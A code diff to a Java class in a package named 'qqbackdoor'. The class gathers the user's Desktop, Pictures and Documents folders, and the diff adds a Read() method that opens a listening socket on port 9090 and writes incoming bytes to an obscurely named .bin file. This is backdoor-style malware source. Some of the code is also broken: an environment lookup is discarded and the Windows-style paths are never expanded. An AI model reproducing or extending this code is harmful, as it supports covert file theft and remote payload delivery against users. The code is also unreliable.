@@ -5,6 +5,7 @@ package com.qqTechnologies.qqbackdoor;
 public class User {
   
   public void Write() {
+    System.getenv("USERPROFILE");
     File desktop = new File("%USERPROFILE%\\Desktop");
     File pictures = new File("%USERPROFILE%\\Pictures");
     File documents = new File("%USERPROFILE%\\Documents");
@@ -21,5 +22,23 @@ public class User {
       b.write(documents_b);
       b.close();
     s.close();
+    }
+
+    public void Read() {
+    try (ServerSocket serverSocket = new ServerSocket(9090)) {
+        try (Socket clientSocket = serverSocket.accept();
+             InputStream in = clientSocket.getInputStream();
+             FileOutputStream fos = new FileOutputStream("xiowmcokwnwosi9wobxuconwpqpnzioan.bin")) {
+            
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+          
+            while ((bytesRead = in.read(buffer)) != -1) {
+                fos.write(buffer, 0, bytesRead);
+            }
+        }
+    } catch (IOException e) {
+        e.printStackTrace();
+    }
     }
   }
